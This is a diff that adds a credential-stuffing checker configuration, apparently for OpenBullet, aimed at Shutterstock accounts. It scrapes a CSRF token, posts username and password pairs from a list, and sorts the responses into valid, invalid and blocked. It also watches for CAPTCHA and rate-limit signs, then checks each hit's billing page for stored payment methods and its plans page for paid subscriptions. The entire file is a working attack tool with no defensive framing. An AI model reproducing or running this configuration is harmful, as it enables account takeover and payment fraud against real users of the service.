@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "Shutterstock",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T16:18:59.4327491+07:00",
+  "AdditionalInfo": "",
+  "Author": "KimoMaka",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://accounts.shutterstock.com/login?hl=en" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "RECAPTCHA_REQUIRED" 
+    KEY "Too Many Requests" 
+    KEY "Something went wrong." 
+PARSE "<SOURCE>" LR "=\"_csrf\" value=\"" "\"" Recursive=FALSE -> VAR "csrf" "" "" 
+REQUEST POST "https://accounts.shutterstock.com/login?hl=en" AutoRedirect=TRUE 
+  CONTENT "_csrf=<csrf>&site=photo&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.shutterstock.com/" 
+  HEADER "Origin: https://www.shutterstock.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "ERROR_INCORRECT_USERNAME_PASSWORD" 
+    KEY "User is required to reset their password" 
+    KEY "This account has been suspended" 
+  KEYCHAIN Ban OR 
+    KEY "RECAPTCHA_REQUIRED" 
+    KEY "Too Many Requests" 
+    KEY "Something went wrong." 
+  KEYCHAIN Success OR 
+    KEY "customer_id" 
+REQUEST GET "https://www.shutterstock.com/account/billing" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "No payment methods on file." 
+  KEYCHAIN Ban OR 
+    KEY "RECAPTCHA_REQUIRED" 
+    KEY "Too Many Requests" 
+    KEY "Something went wrong." 
+REQUEST GET "https://www.shutterstock.com/account/plans" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" AND 
+    KEY "You don't have an active image plan" 
+    KEY "You don't have an active footage plan" 
+    KEY "You don't have an active editorial plan" 
+  KEYCHAIN Ban OR 
+    KEY "RECAPTCHA_REQUIRED" 
+    KEY "Too Many Requests" 
+    KEY "Something went wrong." 
